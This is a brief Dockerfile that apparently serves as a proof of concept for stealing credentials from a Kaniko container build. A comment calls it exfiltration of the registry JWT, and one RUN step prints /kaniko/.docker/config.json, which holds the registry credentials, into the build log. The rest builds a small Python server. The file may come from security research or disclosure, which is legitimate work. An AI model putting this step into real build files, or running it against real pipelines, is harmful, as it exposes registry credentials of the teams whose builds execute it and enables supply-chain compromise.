FROM alpine:3.19

RUN apk add --no-cache python3 curl

# Exfil the Kaniko registry JWT - proves attacker can steal build credentials
RUN echo "=== KANIKO CONFIG ===" && cat /kaniko/.docker/config.json && echo "=== END CONFIG ==="

COPY server.py /server.py
EXPOSE 8080
CMD ["python3", "/server.py"]
